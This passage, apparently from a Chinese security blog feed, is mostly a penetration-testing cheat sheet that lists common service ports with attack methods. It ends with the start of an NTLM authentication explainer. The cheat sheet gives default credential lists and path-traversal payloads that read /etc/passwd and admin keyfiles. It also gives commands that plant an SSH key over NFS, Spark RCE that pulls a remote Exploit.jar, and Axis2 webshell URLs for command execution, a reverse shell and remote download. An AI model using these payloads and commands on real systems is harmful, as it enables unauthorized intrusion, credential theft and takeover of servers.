class="line">rsync XXXXXX::src/etc/passwd /root         传文件（-r、-av ）</span><br><span class="line">rsync /root/passwd XXXXXX::src/tmp </span><br><span class="line">rsync rsync://XXXXX:873/ </span><br><span class="line">rsync rsync://XXXXX:873/文件/ </span><br><span class="line">rsync rsync://XXXXXXXX/src/etc/passwd /root </span><br><span class="line">rsync /root/文件 rsync://XXXXXXXX/src/etc/passwd </span><br></pre></td></tr></table></figure><h1 id="Socket-agent：1080"><a href="#Socket-agent：1080" class="headerlink" title="Socket agent：1080"></a><strong>Socket agent：1080</strong></h1><p><strong>攻击方式</strong></p><ol><li>可以尝试爆破一下代理的用户名和密码。</li></ol><h1 id="RMI：1090、1099"><a href="#RMI：1090、1099" class="headerlink" title="RMI：1090、1099"></a><strong>RMI：1090、1099</strong></h1><p><strong>攻击方式</strong></p><ol><li>远程命令执行（java反序列化，调用rmi方式执行命令）</li></ol><h1 id="Lotus：1352"><a href="#Lotus：1352" class="headerlink" title="Lotus：1352"></a><strong>Lotus：1352</strong></h1><p>IBMx旗下的管理软件。</p><p><strong>攻击方式</strong></p><ol><li><p>弱口令（控制台） admin&#x2F;password</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/names.nsf </span><br><span class="line">/webadmin.nsf </span><br><span class="line">/mail/用户名.nsf </span><br><span class="line">选择&quot;Server&quot;-&quot;Status&quot;-&quot;Quick console&quot;,执行命令 </span><br><span class="line">命令格式：load cmd /c ping c4vm7l.dnslog.cn</span><br></pre></td></tr></table></figure></li><li><p>信息泄露</p></li><li><p>跨站脚本攻击</p></li><li><p>未授权访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MailFS?OpenFrameset</span><br></pre></td></tr></table></figure></li></ol><h1 id="MSSQL：1433、1434"><a href="#MSSQL：1433、1434" class="headerlink" title="MSSQL：1433、1434"></a>MSSQL：1433、1434</h1><p>1433（Server 数据库服务）、1434（Monitor 数据库监控）</p><p><strong>攻击方式</strong></p><ol><li>弱口令（可尝试系统用户）</li></ol><h1 id="Oracle：1521"><a href="#Oracle：1521" class="headerlink" title="Oracle：1521"></a><strong>Oracle：1521</strong></h1><p>默认端口：1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）</p><p><strong>攻击方式</strong></p><ol><li>弱口令</li><li>注入结合XXE</li></ol><h1 id="NFS：2049"><a href="#NFS：2049" class="headerlink" title="NFS：2049"></a><strong>NFS：2049</strong></h1><p>网络文件系统，通过TCP&#x2F;IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。</p><p><strong>攻击方式</strong></p><ol><li>未授权访问：未限制IP以及用户权限设置错误。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rpcinfo -p server_ip          #扫描服务器 </span><br><span class="line">showmount -e server_ip        #查看nfs挂载 </span><br><span class="line">mount -t nfs server_ip:/路径 /tmp/test      #客户端挂载，挂载到本地的/tmp/test路径    </span><br><span class="line">#配置ssh永久连接 </span><br><span class="line">mount -t nfs server_ip:/路径 /tmp/test </span><br><span class="line">ssh-keygen </span><br><span class="line">cat ~/.ssh/id_rsa.pub &gt;&gt; /tmp/test/root/.ssh/autorized_keys ssh root@server_ip </span><br><span class="line">umount /tmp/   #卸载挂载</span><br></pre></td></tr></table></figure><h1 id="Zookeeper：2181"><a href="#Zookeeper：2181" class="headerlink" title="Zookeeper：2181"></a><strong>Zookeeper：2181</strong></h1><p>分布式的，开放源码的分布式应用程序协调服务；提供功能包括：配置维护、域名服务、分布式同步、组服务等。</p><p><strong>攻击方式</strong></p><ol><li>未授权访问，可以使用zooinspector远程连接。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo envi |nc XXXXX 2181 </span><br><span class="line">echo dump |nc XXXXX 2181 </span><br><span class="line">echo stat |nc XXXXX 2181 </span><br><span class="line">echo ruok |nc XXXXX 2181 </span><br><span class="line">echo reqs |nc XXXXX 2181</span><br></pre></td></tr></table></figure><h1 id="Grafana：3000"><a href="#Grafana：3000" class="headerlink" title="Grafana：3000"></a>Grafana：3000</h1><p><strong>攻击方式</strong></p><ol><li>弱口令</li><li>SSRF</li><li>未授权访问</li><li>任意文件读取</li></ol><h1 id="MySQL：3306"><a href="#MySQL：3306" class="headerlink" title="MySQL：3306"></a>MySQL：3306</h1><p><strong>攻击方式</strong></p><ol><li>弱口令</li><li>身份认证漏洞：CVE-2012-2122任意密码登录，理论尝试256次即可</li><li>All MariaDB and MySQL versions up to 5.1.61, 5.2.11, 5.3.5, 5.5.22 are</li><li>Phpmyadmin万能密码绕过：用户名：‘localhost‘@‘@”  密码任意</li><li>拒绝服务攻击：利用sql语句是服务器进行死循环打死服务器</li></ol><h1 id="Windows-RDP：3389"><a href="#Windows-RDP：3389" class="headerlink" title="Windows RDP：3389"></a>Windows RDP：3389</h1><p>可能改为：3390、13389</p><p><strong>攻击方式</strong></p><ol><li>弱口令</li><li>Shift粘滞键后门</li><li>ms12-020蓝屏</li></ol><h1 id="GlassFish：4848、8080、3700"><a href="#GlassFish：4848、8080、3700" class="headerlink" title="GlassFish：4848、8080、3700"></a>GlassFish：4848、8080、3700</h1><p>4848（控制台）、8080（web）、3700（iiop）</p><p><strong>攻击方式</strong></p><ol><li><p>弱口令（控制台）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Applications-&gt;deploy</span><br></pre></td></tr></table></figure></li><li><p>任意文件读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd </span><br><span class="line">:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/domains/domain1/config/admin-keyfile</span><br></pre></td></tr></table></figure></li><li><p>认证绕过</p><p>CVE-2011-1511</p></li></ol><h1 id="DB2：5000"><a href="#DB2：5000" class="headerlink" title="DB2：5000"></a><strong>DB2：5000</strong></h1><p><strong>攻击方式</strong></p><ol><li>安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）。</li></ol><h1 id="SysBase：4100、4200、5000"><a href="#SysBase：4100、4200、5000" class="headerlink" title="SysBase：4100、4200、5000"></a>SysBase：4100、4200、5000</h1><p>4100（监听）、4200（备份）、5000（服务）</p><p><strong>攻击方式</strong></p><ol><li>弱口令</li><li>注入</li></ol><h1 id="VNC：5900、5901、5902"><a href="#VNC：5900、5901、5902" class="headerlink" title="VNC：5900、5901、5902"></a><strong>VNC：5900、5901、5902</strong></h1><p>一款优秀的远控工具，常用语类UNIX系统上。</p><p><strong>攻击方式</strong></p><ol><li>弱口令：VNCX4.exe</li><li>认证口令绕过</li><li>拒绝服务攻击：CVE-2015-5239</li><li>权限提升：CVE-2013-6886</li></ol><h1 id="PostgreSQL：5432"><a href="#PostgreSQL：5432" class="headerlink" title="PostgreSQL：5432"></a><strong>PostgreSQL：5432</strong></h1><p>一种特性非常齐全的自由软件的对象–关系型数据库管理系统。</p><p><strong>攻击方式</strong></p><ol><li>弱口令：postgres&#x2F;postgres</li><li>缓冲区溢出：CVE-2014-2669</li><li>XXE：老版本</li><li>注入</li><li>读写文件</li><li>命令执行</li></ol><h1 id="Pcanywhere：5632"><a href="#Pcanywhere：5632" class="headerlink" title="Pcanywhere：5632"></a><strong>Pcanywhere：5632</strong></h1><p>一款远控工具，有点类似vnc的功能。</p><p><strong>攻击方式</strong></p><ol><li>提权控制服务，下载cif解密，或者找到版本并上传自己生成的cif进行连接。</li><li>拒绝服务攻击</li></ol><h1 id="Spark：6066、7077、8081、8082"><a href="#Spark：6066、7077、8081、8082" class="headerlink" title="Spark：6066、7077、8081、8082"></a><strong>Spark：6066、7077、8081、8082</strong></h1><p>一款快速通用的集群计算平台。</p><p><strong>攻击方式</strong></p><p>未授权RCE。</p><p>利用REST API，向6066端口发送指令创建任务，使其主动调用部署在远程服务器上的攻击脚本执行代码，随后点击日志查看结果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./submit.sh 10.188.201.91:6066 2.1.0 https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar &quot;whoami&quot;</span><br></pre></td></tr></table></figure><p>利用Apache Spark自带的脚本bin&#x2F;spark-submit，向master的主端口7077提交应用，随后点击日志查看结果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/spark-submit --master spark://your-ip:7077 --deploy-mode cluster --class Exploit https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar id</span><br></pre></td></tr></table></figure><h1 id="Redis：6379"><a href="#Redis：6379" class="headerlink" title="Redis：6379"></a>Redis：6379</h1><p>key-value数据库。</p><p><strong>攻击方式</strong></p><ol><li>弱口令</li><li>未授权访问</li><li>linux：写公钥ssh提权；在crontab写定时任务反弹shell；在web目录下写shell。</li><li>win：写入启动项；写入mof、dll劫持等；在web目录下写shell。</li></ol><h1 id="WebLogic：7001、7002"><a href="#WebLogic：7001、7002" class="headerlink" title="WebLogic：7001、7002"></a><strong>WebLogic：7001、7002</strong></h1><p>7001（http）、7002（https）</p><p><strong>攻击方式：</strong></p><ol><li><p>控制台路径泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">weblogic/weblogic、Oracle@123、weblogic123、12345678 </span><br><span class="line">system/password、security </span><br><span class="line">admin/security </span><br><span class="line">mary/password </span><br><span class="line">joe/password </span><br><span class="line">wlcsystem/wlcsystem </span><br><span class="line">wlpisystem/wlpisystem</span><br></pre></td></tr></table></figure></li><li><p>登录console后部署webshell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Deploy=&gt;web application modules=&gt;Deploy a new Web Application Module...=&gt;upload your file(s)=&gt;Deploy</span><br></pre></td></tr></table></figure></li><li><p>部署&#x3D;&gt;安装&#x3D;&gt;上载文件&#x3D;&gt;部署档案&#x3D;&gt;将此部署安装为应用程序。</p></li><li><p>java反序列化-T3协议:</p><p>CVE-2016-0638、CVE-2016-3510、CVE-2017-3248、CVE-2018-2628 CVE-2018-2893、CVE-2018-3191、CVE-2018-3245、CVE-2018-3252 CVE-2019-2725、CVE-2019-2729、cve-2020-2883、CVE-2020-14644&#x2F;14645</p></li><li><p>XMLDecoder反序列化：CVE-2017-3506、CVE-2017-10271</p></li><li><p>Oracle Coherence反序列化：CVE-2020-2555</p></li><li><p>IIOP反序列化：CVE-2020-2551</p></li><li><p>未授权访问：CVE-2020-14882&#x2F;14883</p></li><li><p>任意文件上传：CVE-2018-2894、CVE-2019-2618</p></li><li><p>任意文件读取：CVE-2019-2615</p></li><li><p>SSRF：CVE-2014-4210</p></li><li><p>密码破解</p></li></ol><h1 id="Cloudera-Manager：7180、7183"><a href="#Cloudera-Manager：7180、7183" class="headerlink" title="Cloudera Manager：7180、7183"></a><strong>Cloudera Manager：7180、7183</strong></h1><p>7180（http）、7183（https）</p><p><strong>攻击方式：</strong></p><ol><li>弱口令：admin&#x2F;admin</li></ol><h1 id="Resin：8080"><a href="#Resin：8080" class="headerlink" title="Resin：8080"></a><strong>Resin：8080</strong></h1><p>应用服务器。</p><p><strong>攻击方式</strong></p><ol><li><p>目录遍历</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/resin-doc/examples/ioc-periodictask/viewfile?file=index.xtp /resin-admin/status.php</span><br></pre></td></tr></table></figure></li><li><p>任意文件读取：特定版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Caucho Technology Resin v3.0.17-21 for Windows </span><br><span class="line">Caucho Technology Resin v3.1.0 for Windows </span><br><span class="line">Caucho Technology Resin Professional v3.1.0 for Windows</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd </span><br><span class="line">/resin-doc/examples/jndi-appconfig/test?inputFile=../../../../../../../../../../etc/passwd /%20..\\\\web-inf&quot; /C:%5C/</span><br></pre></td></tr></table></figure></li></ol><h1 id="Tomcat：8080"><a href="#Tomcat：8080" class="headerlink" title="Tomcat：8080"></a><strong>Tomcat：8080</strong></h1><p><strong>攻击方式</strong></p><ol><li><p>任意文件包含：</p><p>CVE-2020-1938 Ghostcat，AJP 8009端口</p></li><li><p>RCE：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CVE-2020-9484 会话持久性，cluster功能共享session，利用条件苛刻 </span><br><span class="line">CVE-2019-0232 /cgi-bin/，利用条件苛刻 </span><br><span class="line">CVE-2017-12615 需要readonly=false，默认是true</span><br></pre></td></tr></table></figure></li><li><p>HTTP慢速攻击：可以把服务器打死，对一些大型的网站有影响。</p></li><li><p>弱口令：manager后台</p></li></ol><h1 id="Axis2：8080"><a href="#Axis2：8080" class="headerlink" title="Axis2：8080"></a><strong>Axis2：8080</strong></h1><p>新一代的SOAP引擎，可构建webservice。</p><p><strong>攻击方式</strong></p><ol><li><p>弱口令：manager后台，admin&#x2F;axis2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/axis2/axis2-admin/login 登录 </span><br><span class="line">/axis2/services/Cat/exec?cmd=whoami 命令执行 </span><br><span class="line">/axis2/services/config/exec?cmd=whoami </span><br><span class="line">/axis2/services/Cat/shell?host=192.168.76.1&amp;port=2222   反弹shell /axis2/services/Cat/getClassPath</span><br><span class="line">/axis2/services/FileUploader?wsdl 构造上传页面 </span><br><span class="line">/axis2/services/FileUploader/uploadFile?document=码 </span><br><span class="line">/axis2/services/config/download?url=http://XXXX或IP:2475/test.jsp&amp;path=路径test.jsp   远程下载</span><br></pre></td></tr></table></figure></li><li><p>HTTP慢速攻击：可以把服务器打死，对一些大型的网站有影响。</p></li></ol><h1 id="Jetty：8080"><a href="#Jetty：8080" class="headerlink" title="Jetty：8080"></a><strong>Jetty：8080</strong></h1><p>一款Java Web服务器。</p><p><strong>攻击方式</strong></p><ol><li>目录遍历：CVE-2011-4404</li><li>远程共享缓冲区泄漏：CVE-2015-2080</li></ol><h1 id="Jenkins：8080、8089"><a href="#Jenkins：8080、8089" class="headerlink" title="Jenkins：8080、8089"></a><strong>Jenkins：8080、8089</strong></h1><p>Java开发的一种持续集成工具，监控持续重复的工作。</p><p><strong>攻击方式</strong></p><ol><li><p>弱口令：admin&#x2F;admin</p><p>登录后寻找脚本执行界面：<a href="http://ip:port/script">http://ip:port/script</a> </p><p>执行：println &quot;ifconfig&quot;.execute().text</p></li><li><p>未授权访问</p></li><li><p>反序列化</p></li></ol><h1 id="Jboss：8080、9990"><a href="#Jboss：8080、9990" class="headerlink" title="Jboss：8080、9990"></a><strong>Jboss：8080、9990</strong></h1><p>8080（console），其他端口1098&#x2F;1099&#x2F;4444&#x2F;4445&#x2F;8080&#x2F;8009&#x2F;8083&#x2F;8093</p><p><strong>攻击方式：</strong></p><ol><li><p>弱口令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin/admin、admin-console、jmx-console、web-console、status</span><br></pre></td></tr></table></figure></li><li><p>直接部署war包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.deployment:flavor=URL,type=DeploymentScanner</span><br><span class="line">/admin-console/secure/resourceContentCreate.seam?conversationId=32</span><br></pre></td></tr></table></figure></li><li><p>Java反序列化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CVE-2013-4810       /invoker/EJBInvokerServlet </span><br><span class="line">CVE-2015-7501       /invoker/JMXInvokerServlet </span><br><span class="line">CVE-2017-7504       /jbossmq-httpil/HTTPServerILServlet </span><br><span class="line">CVE-2017-12149      /invoker/readonly</span><br></pre></td></tr></table></figure></li><li><p>未授权访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/admin-console/login.seam </span><br><span class="line">/jmx-console/HtmlAdaptor?action=displayMBeans </span><br><span class="line">/web-console/ServerInfo.jsp</span><br></pre></td></tr></table></figure></li><li><p>返回头中泄露中间件版本信息</p><p>X-Powered-By</p></li><li><p>Jboss蠕虫：&#x2F;zecmd&#x2F;zecmd.jsp、idssvc.jsp、iesvc.jsp、wstats.jsp、invoker.jsp</p></li><li><p>seam2模板注入：CVE-2010-1871</p></li></ol><h1 id="InfluxDB：8086"><a href="#InfluxDB：8086" class="headerlink" title="InfluxDB：8086"></a>InfluxDB：8086</h1><p>go语言编写的时序数据库。</p><p><strong>攻击方式</strong></p><p>1.未授权访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://ip:8086/debug/vars</span><br><span class="line"></span><br><span class="line">post http://ip:8086/query</span><br><span class="line">q=show+databases</span><br></pre></td></tr></table></figure><h1 id="Apache-Activemq：8161、61616"><a href="#Apache-Activemq：8161、61616" class="headerlink" title="Apache Activemq：8161、61616"></a>Apache Activemq：8161、61616</h1><p>8161（后台）、61616（tcp）</p><p><strong>攻击方式</strong></p><ol><li><p>弱口令：admin&#x2F;admin</p></li><li><p>未授权访问：&lt;&#x3D;5.7.0 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://XXXXXXXX:8161/admin http://XXXXXXXX:8161/fileserver/</span><br></pre></td></tr></table></figure></li><li><p>文件上传：5.X ~ 5.11.X（5.12.x-5.13.x默认关闭这个应用，5.14.x已经删除）</p><p>CVE-2016-3088：PUT报错获取物理路径（&#x2F;什么什么&#x2F;apache-activemq-5.11.1&#x2F;webapps&#x2F;admin）并传文件，MOVE移动到admin下 。</p><p>写入webshell 。</p><p>写入cron或ssh key等文件 。</p><p>写入jar或jetty.xml等库和配置文件。</p></li><li><p>反序列化：&lt;5.13.X</p><p>CVE-2015-5254：构造事件发送给目标61616端口，登录web界面点击触发事件</p></li></ol><h1 id="Sun-AnswerBook2：8888"><a href="#Sun-AnswerBook2：8888" class="headerlink" title="Sun AnswerBook2：8888"></a><strong>Sun AnswerBook2：8888</strong></h1><p>文档服务器软件，使用第三方的web服务器dwhttpd提供web访问功能，但没有对所有的管理脚本都做访问控制，允许未授权用户访问一些管理脚本。</p><p><strong>攻击方式</strong></p><p>1.2 - 1.4.2        影响版本</p><ol><li><p>未授权访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://IP:8888/ab2/@AdminViewError 访问错误日志 </span><br><span class="line">http://IP:8888/ab2/@AdminAddadmin?uid=foo&amp;password=bar&amp;re_password=bar 添加账户和密码</span><br></pre></td></tr></table></figure></li><li><p>远程格式化字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;print&quot;GET /&quot;;print&quot;%x&quot;x20;print&quot; HTTP/1.0\r\n\r\n\r\n\&quot;&#x27; | nc localhost 8888</span><br></pre></td></tr></table></figure><p>可以看到报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http-8888 waring:send-file reports: the requested object。。。。。 </span><br></pre></td></tr></table></figure></li><li><p>任意文件读取</p></li></ol><h1 id="Websphere：9090、9091"><a href="#Websphere：9090、9091" class="headerlink" title="Websphere：9090、9091"></a><strong>Websphere：9090、9091</strong></h1><p><strong>攻击方式</strong></p><ol><li><p>弱口令：控制台&#x2F;ibm&#x2F;console&#x2F;logon.jsp，WebSphere企业应用程序-&gt;安裝</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin/admin </span><br><span class="line">websphere/websphere </span><br><span class="line">ststem/manager </span><br><span class="line">admin/空 </span><br><span class="line">Websphere6.x-7.x</span><br></pre></td></tr></table></figure></li><li><p>任意文件泄漏：CVE-2014-0823</p></li><li><p>信息泄露：CVE-2017-1423、CVE-2019-4505</p></li><li><p>java反序列化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2015-7450、CVE-2018-1567、CVE-2019-4279、CVE-2020-4276、CVE-2020-4362、CVE-2020-4450</span><br></pre></td></tr></table></figure></li></ol><h1 id="Elasticsearch：9200、9300"><a href="#Elasticsearch：9200、9300" class="headerlink" title="Elasticsearch：9200、9300"></a><strong>Elasticsearch：9200、9300</strong></h1><p>9200（http）、9300（tcp）</p><p>服务名：wap-wsp，搜索服务器，企业级搜索引擎，支持通过HTTP使用JSON进行数据索引。</p><p><strong>攻击方式</strong></p><ol><li><p>远程代码执行：</p><p>MVEL &lt;1.1.1 CVE-2014-3120 </p><p>沙盒绕过Groovy代码执行 1.3.0-1.3.7、1.4.0-1.4.2 CVE-2015-1427</p></li><li><p>任意文件读取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_plugin/head/      &lt;1.4.5以下或&lt;1.5.2       CVE-2015-3337 </span><br><span class="line">/_snapshot        1.0.0-1.6.0      CVE-2015-5531</span><br></pre></td></tr></table></figure></li><li><p>未授权访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://XXXXXXX:9200/ </span><br><span class="line">http://XXXXXX:9200/_plugin/head/ </span><br><span class="line">http://XXXXXX:9200/_nodes </span><br><span class="line">http://XXXXXX:9200/_search?preety</span><br></pre></td></tr></table></figure></li></ol><h1 id="Zabbix：10050、10051"><a href="#Zabbix：10050、10051" class="headerlink" title="Zabbix：10050、10051"></a>Zabbix：10050、10051</h1><p>10050（agent）、10051（server）</p><p>基于Web界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。监视各种网络参数，保证服务器系统的安全运营。</p><p><strong>攻击方式</strong></p><ol><li>弱口令：Admin&#x2F;zabbix、zabbix&#x2F;zabbix、guest&#x2F;空，登录后命令执行</li><li>前台注入（非登录）&lt;3.0.4</li></ol><h1 id="memcache：11211"><a href="#memcache：11211" class="headerlink" title="memcache：11211"></a><strong>memcache：11211</strong></h1><p>一套分布式的高速缓存系统，使用的key-value存储目，前被许多网站使用以提升网站的访问速度，尤其对于一些大型的、需要频繁访问数据库的网站访问速度提升效果十分显著。</p><p><strong>攻击方式</strong></p><ol><li>未授权访问（IP限制）：telnet上以后执行stats items。</li></ol><h1 id="MongoDB：27017、28017"><a href="#MongoDB：27017、28017" class="headerlink" title="MongoDB：27017、28017"></a><strong>MongoDB：27017、28017</strong></h1><p>28017（REST接口）</p><p>NoSQL数据库，mongodb默认允许空口令远程连接，数据库本身可以限制登录IP的。</p><p><strong>攻击方式</strong></p><ol><li>弱口令</li><li>未授权访问</li></ol><h1 id="Hadoop：more"><a href="#Hadoop：more" class="headerlink" title="Hadoop：more"></a><strong>Hadoop：more</strong></h1><p>HDFS NameNode 50070<br>HDFS SecondNameNode 50090<br>HDFS DataNode 50075<br>HDFS Backup&#x2F;Checkpoint node 50105<br>MapReduce JobTracker 50030<br>MapReduce TaskTracker 50060</p><p><strong>攻击方式</strong></p><ol><li><p>弱口令：admin&#x2F;123456</p></li><li><p>命令执行</p></li><li><p>注入：EasyHadoopManager1.1.1-1 Beta1版本</p></li><li><p>对外访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://XXXXXX/cluster/nodes </span><br><span class="line">http://XXXXXXX/logs/ </span><br><span class="line">http://XXXXXXX/dfshealth.jsp </span><br><span class="line">http://XXXXXX/jobtracker.jsp</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> 杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 端口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows认证之NTLM协议</title>
      <link href="/2021/02/06/cd3fe512.html"/>
      <url>/2021/02/06/cd3fe512.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在域环境中通常采用基于Kerberos的身份认证方式。在工作组环境中通常采用基于NTLM的身份认证方式，认证过程相对比较简单。</p><p>域环境也是支持NTLM认证的，但是非域控服务器不存储域用户hash，所以域环境下的NTLM认证使用了Pass Through Authentication机制来完成用户认证流程：服务器充当客户端与DC之间的中转站，起转发作用。</p><h1 id="NTLM协议"><a href="#NTLM协议" class="headerlink" title="NTLM协议"></a>NTLM协议</h1><p>一种网络认证协议。NTLM协议是以NTLM hash作为根本凭证，基于挑战&#x2F;响应消息交互模式的认证过程，包括NTLM v1和NTLM v2两个版本。</p><ul><li>协商：确认双方支持的协议版本。</li><li>质询：挑战响应机制，包括交互式和非交互式。</li><li>身份验证：质询完成后进行结果验证。</li></ul><p>常见攻击方式：</p><p>pth、ntlm-relay attacks（NTLM中继攻击）</p><h2 id="质询完整流程"><a href="#质询完整流程" class="headerlink" title="质询完整流程"></a>质询完整流程</h2><p>ps：目标不一定是DC，若在域环境中，会使用PTA机制，服务端通过Netlogon协议建立安全通道与DC通信，否则为客户端与服务器之间的通信，将DC替换为服务器即可。</p><ol><li>客户端输入username、password、domain进行登录（交互式输入，非交互式不用输入），然后将密码hash缓存在本地，当请求服务器资源时，将username发送到服务器，服务器转发给DC。</li><li>DC生成一个16字节的随机数，即Challenge（挑战码，每次生成都不同），然后传回服务器，再到客户端。</li><li>客户端使用用户NTLM hash加密challenge生成24字节的response（Net-NTLM hash），并将response发送给服务器。在域环境下非域控服务器不存储域用户hash，所以服务器将response转发给DC，然后DC根据之前传过来的username到域控的账号数据库ntds.list找到对应的密码hash，用其加密challenge，将结果与客户端传过来的response进行对比验证。</li></ol><h2 id="NTLM-v1和NTLM-v2"><a href="#NTLM-v1和NTLM-v2" class="headerlink" title="NTLM v1和NTLM v2"></a><strong>NTLM v1和NTLM v2</strong></h2><p>各系统默认配置：</p><ul><li>Windows 2000、XP：发送LM&amp;NTLM响应。</li><li>Server 2003：仅发送NTLM响应。</li><li>Windows Vista、Server 2008、Win 7、Server 2008 R2及以上：仅发送NTLMv2响应。</li></ul><p>区别:</p><ul><li>v1的Challenge是8位，v2的Challenge是16位。</li><li>加密方式不同，生成的Net-NTLM hash不同，v1的主要加密算法是DES，v2的主要加密算法是HMAC-MD5。</li></ul><h2 id="Net-NTLM-hash"><a href="#Net-NTLM-hash" class="headerlink" title="Net-NTLM hash"></a><strong>Net-NTLM hash</strong></h2><p>指在网络环境中经过NTLM hash加密Challenge的结果，使用Responder抓取的结果就包含该hash。该hash无法直接进行pth，只能使用hashcat等工具得到明文后进行横向移动。</p><p>其中，nt_response和lm_response一起被称为Net-NTLM hash，有时nt_response也被称为Net-NTLM hash，不必在意这些细节。</p><h2 id="配置挑战响应级别"><a href="#配置挑战响应级别" class="headerlink" title="配置挑战响应级别"></a><strong>配置挑战响应级别</strong></h2><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210206154047.png"></p><h1 id="本地登录认证"><a href="#本地登录认证" class="headerlink" 